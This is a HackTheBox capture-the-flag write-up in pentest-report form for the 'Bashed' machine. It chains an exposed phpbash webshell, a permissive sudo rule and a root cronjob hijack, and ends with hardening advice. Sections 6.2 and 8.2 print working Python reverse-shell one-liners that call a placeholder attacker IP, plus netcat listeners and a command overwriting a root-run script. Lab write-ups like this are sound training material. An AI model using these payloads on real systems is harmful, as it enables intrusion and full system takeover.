# Bashed - Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-07 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only \

---

## 0. Executive Summary

The "Bashed" machine was found to contain three critical misconfigurations. A developer had left an exposed PHP webshell (`phpbash.php`) in a publicly accessible directory, granting unauthenticated command execution as `www-data`. A sudo misconfiguration then allowed lateral movement to the `scriptmanager` user. A root-owned cronjob executing a script writable by `scriptmanager` completed the chain, resulting in full system compromise. Immediate removal of exposed webshells, review of sudo permissions, and auditing of cron jobs running as root are recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"Bashed"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined
in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Gobuster → Exposed phpbash webshell → www-data shell → sudo misconfiguration → scriptmanager → Root cronjob hijack → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `phpbash` | Pre-existing webshell on target |
| `netcat` | Reverse shell listener |
| `python3` | Shell stabilization & reverse shell payload |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -Pn -sC -sV -T4 -p- 10.129.1.80
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) | Title: "Arrexel's Development Site" |

**Key Observations:**
- Only port 80 exposed — attack surface is entirely web-based
- Apache 2.4.18 on Ubuntu — older version worth noting
- `-Pn` flag required as host was blocking ICMP ping probes

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, manual inspection

**Commands:**
```bash
gobuster dir -u http://10.129.1.80 -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**

| Path | Status | Notes |
|------|--------|-------|
| `/dev` | 301 | Directory listing enabled — contained webshell |
| `/uploads` | 301 | Upload directory — noted for potential file upload vectors |
| `/php` | 301 | PHP directory |
| `/.htaccess` | 403 | Forbidden |

**Key Finding:** `/dev` had directory listing enabled and exposed two PHP webshell files:
- `phpbash.php`
- `phpbash.min.php`

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Exposed PHP webshell with unauthenticated access \
**Location:** `http://10.129.1.80/dev/phpbash.php` \
**Reasoning:** Developer left a testing tool (`phpbash`) accessible on the production server with no authentication, granting direct command execution in the browser as `www-data`.

### 6.2 Exploitation

Navigating to `/dev/phpbash.php` provided an interactive browser-based shell. To obtain a stable reverse shell for privilege escalation, a Python3 reverse shell payload was used.

```bash
# Listener on attacker machine
nc -lvnp 4444

# Payload executed via phpbash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Shell stabilization
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z → stty raw -echo; fg → reset
```

**Result:** Stable shell obtained as `www-data`.

---

## 7. Lateral Movement

**From:** `www-data` \
**To:** `scriptmanager`

**Method:**
- Ran `sudo -l` as `www-data`
- Found: `www-data` may run ALL commands as `scriptmanager` with no password
- Executed `sudo -u scriptmanager /bin/bash -i` to switch users

```bash
sudo -l
# Output: (scriptmanager : scriptmanager) NOPASSWD: ALL

sudo -u scriptmanager /bin/bash -i
```

**Result:** Shell obtained as `scriptmanager`.

> **Note:** A proper TTY (via reverse shell) was required — phpbash alone could not hold the sudo session due to lacking a full terminal environment.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — led to lateral movement above
- [x] Investigated `/scripts` directory as `scriptmanager`
- [x] Checked file ownership on `/scripts` contents

**Key Findings:**
- `/scripts/test.py` — owned by `scriptmanager` (writable by us)
- `/scripts/test.txt` — owned by `root` (written to by test.py)
- Timestamp on `test.txt` updated regularly → root is executing `test.py` via cronjob

### 8.2 Escalation Vector

**Vector:** Root cronjob executing a script writable by `scriptmanager` \
**Root Cause:** A cronjob running as root executed `/scripts/test.py`, which was owned and writable by `scriptmanager`. No integrity checking or restricted permissions were in place.

```bash
# Overwrote test.py with a reverse shell payload
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /scripts/test.py

# Listener on attacker machine
nc -lvnp 5555

# Waited ~1 minute for cronjob to execute
```

**Result:** Root shell obtained when cron executed the hijacked script.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Exposed PHP webshell with no authentication | 🔴 Critical | `/dev/phpbash.php` |
| 2 | sudo misconfiguration — www-data → scriptmanager (NOPASSWD: ALL) | 🔴 Critical | `/etc/sudoers` |
| 3 | Root cronjob executing user-writable script | 🔴 Critical | `/scripts/test.py` |
| 4 | Directory listing enabled on web server | 🟡 Medium | `/dev`, `/uploads` |

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Outbound connections from web server process (`www-data`) to unknown IPs on non-standard ports
- Modification timestamp change on `/scripts/test.py`
- Unexpected reverse shell processes spawned by cron
- Gobuster/directory enumeration activity in Apache access logs

### 10.2 Security Weaknesses

- Development/testing tools (`phpbash`) left on production server
- Overly permissive sudo rules granting full access between service accounts
- Root-owned cronjob executing scripts in a directory writable by unprivileged users

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove phpbash and any other webshells from the server | Finding 1 |
| Immediate | Restrict sudo permissions — apply least privilege principle | Finding 2 |
| Immediate | Ensure scripts executed by root are only writable by root | Finding 3 |
| Short-term | Disable directory listing on Apache (`Options -Indexes`) | Finding 4 |
| Short-term | Audit all cron jobs and their file permission chains | Finding 3 |
| Long-term | Implement file integrity monitoring (FIM) on sensitive directories | All |

---

## 11. Lessons Learned

- **Gobuster is essential** — the entire attack chain started with finding `/dev`. Without directory enumeration the webshell would never have been discovered.
- **phpbash is a real-world risk** — developers commonly leave testing tools on servers and forget about them. This is a common real pentest finding.
- **sudo -l is always the first privesc check** — a single misconfigured sudo rule opened lateral movement immediately.
- **Cronjob hijacking is powerful but subtle** — the key insight was noticing `test.txt` was owned by root despite being written by a script owned by `scriptmanager`. Ownership of output files reveals who runs the script.
- **TTY matters** — phpbash alone wasn't enough for stable privilege escalation. A proper reverse shell with TTY stabilization was necessary for the sudo session to hold.

---

*End of Report* \
*Classification: Public — flags and sensitive values omitted*
